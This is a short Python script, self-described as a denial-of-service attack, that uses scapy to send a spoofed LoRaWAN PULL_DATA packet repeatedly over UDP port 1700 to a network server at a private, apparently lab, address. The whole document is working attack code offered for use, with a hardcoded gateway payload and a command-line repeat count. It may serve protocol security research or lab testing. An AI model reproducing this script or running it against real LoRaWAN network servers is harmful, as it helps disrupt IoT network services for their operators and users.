#Denial of Service Attack Script that sends mutiple PULL_DATA headers to the Network Server 

import sys
import time
from scapy.all import *

# Define the destination address and port
dest_addr = '192.168.56.104'
dest_port = 1700

# Define the PULL_DATA payload as a string of hexadecimal characters

payloadx = '02c0ad02b4562d94afcda48d'

# Convert the payload to binary format using the bytes.fromhex() method

payload = bytes.fromhex(payloadx)

# Define the IP and UDP headers
ip = IP(dst=dest_addr)
udp = UDP(dport=dest_port)

# Construct the packet by combining the headers and payload
packet = ip / udp / payload

num_times = int(sys.argv[1])

# Send the packet to the destination IP address and port the specified number of times
for i in range(num_times):
    send(packet) 
    time.sleep(3)

print(f"Packets sent: {num_times}")
